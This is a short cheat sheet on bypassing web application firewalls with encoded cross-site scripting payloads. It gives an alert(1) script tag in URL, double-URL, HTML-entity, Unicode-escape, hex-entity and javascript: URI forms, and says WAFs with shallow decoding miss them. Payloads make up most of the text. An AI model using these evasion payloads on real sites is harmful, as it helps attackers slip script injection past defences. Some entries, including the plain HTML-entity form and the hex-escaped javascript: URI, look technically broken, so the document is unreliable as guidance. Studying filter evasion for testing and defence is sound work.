Bypassing WAFs for XSS with Encoding

Crafting XSS payloads using various encoding schemes.

// Original XSS Payload (often blocked)
<script>alert(1)</script>

// 1. URL Encoding
%3Cscript%3Ealert(1)%3C/script%3E

// 2. Double URL Encoding
%253Cscript%253Ealert(1)%253C/script%253E

// 3. HTML Entities
&lt;script&gt;alert(1)&lt;/script&gt;

// 4. Unicode Escape Sequences
\u003cscript\u003ealert(1)\u003c/script\u003e

// 5. Combined Example
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

// 6. Javascript URI with Hex Encoding
javascript:alert\x281\x29

Encoding Types Explained

  • URL Encoding: Converts unsafe characters into %XX format.
  • HTML Entities: Represents characters using named or numeric entities (e.g., &lt;).
  • Unicode Escapes: Uses \uXXXX to represent characters, often processed by JavaScript engines.

Why It Works

WAFs may have limited decoding depth or lack rules for all encoding variations, allowing the browser to interpret the malicious code after WAF inspection.

Key Takeaway

Diverse encoding methods like URL encoding, HTML entities, and Unicode escape sequences can mask XSS payloads, allowing them to slip past WAFs that fail to decode all layers or types.
